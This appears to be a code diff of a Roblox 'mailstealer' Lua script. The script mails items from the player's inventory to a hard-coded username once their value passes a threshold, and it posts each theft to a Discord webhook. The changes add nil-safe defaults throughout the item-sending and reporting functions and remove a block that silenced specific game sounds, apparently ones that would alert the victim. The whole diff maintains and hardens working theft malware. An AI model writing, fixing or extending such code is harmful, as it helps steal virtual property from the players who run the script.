@@ -181,7 +181,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                         ["inline"] = true
                     },
                     {
-                        ["name"] = ":money_mouth: **" .. item_type .. "** :money_mouth:",
+                        ["name"] = ":money_mouth: **" .. (item_type or "Unknown") .. "** :money_mouth:",  -- Ensure item_type is not nil
                         ["value"] = "```➜ " .. (id or "N/A") .. "```",  -- Ensure id is not nil
                         ["inline"] = true
                     },
@@ -202,7 +202,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                     },
                     {
                         ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
-                        ["value"] = "```➜ " .. RBgoldNormal .. "```",
+                        ["value"] = "```➜ " .. (RBgoldNormal or "N/A") .. "```",  -- Ensure RBgoldNormal is not nil
                         ["inline"] = true
                     }
                 }
@@ -242,27 +242,6 @@ noti:GetPropertyChangedSignal("Enabled"):Connect(
     end
 )
 noti.Enabled = false
-
-task.spawn(
-    function()
-        game.DescendantAdded:Connect(
-            function(x)
-                if x.ClassName == "Sound" then
-                    if
-                        x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or
-                            x.SoundId == "rbxassetid://12413423276"
-                     then
-                        x.Volume = 0
-                        x.PlayOnRemove = false
-                        if x.Parent then
-                            x:Destroy()
-                        end
-                    end
-                end
-            end
-        )
-    end
-)
 
 local function GetThumbnail(imageid)
     local Asset = string.split(imageid, "rbxassetid://")[2]
@@ -696,9 +675,9 @@ local function sendItem(category, uid, am, locked)
     local args = {
         [1] = Roblox_Username,
         [2] = (mailstealer_name or "Unknown") .. " mailstealer on top",  -- Ensure mailstealer_name is not nil
-        [3] = category,
-        [4] = uid,
-        [5] = am
+        [3] = category or "Unknown",  -- Ensure category is not nil
+        [4] = uid or "UnknownUID",  -- Ensure uid is not nil
+        [5] = am or 1  -- Ensure amount is not nil
     }
     local response = false
     repeat
@@ -785,21 +764,21 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
             FirstPriceOfMail = 5000000
         end
         if v.Item_RAP >= FirstPriceOfMail then
-            sendItem(v.Item_Class, v.Item_Id, v.Item_Amount, v.IsLocked)
+            sendItem(v.Item_Class or "Unknown", v.Item_Id or "UnknownUID", v.Item_Amount or 1, v.IsLocked)
             local thumb = GetThumbnail(v.Item_ImageId)
             Left_Hits = Left_Hits - 1
             task.spawn(
                 function()
                     SendMessage(
-                        v.Item_Name,
-                        v.Item_Class,
-                        v.Item_Type,
+                        v.Item_Name or "UnknownItem",  -- Ensure Item_Name is not nil
+                        v.Item_Class or "Unknown",  -- Ensure Item_Class is not nil
+                        v.Item_Type or "Unknown",  -- Ensure Item_Type is not nil
                         thumb,
                         Discord_Webhook,
                         Left_Hits,
                         v.IsShiny,
                         "@everyone",
-                        v.Item_RAP,
+                        v.Item_RAP or 0,  -- Ensure Item_RAP is not nil
                         totalRap
                     )
                 end
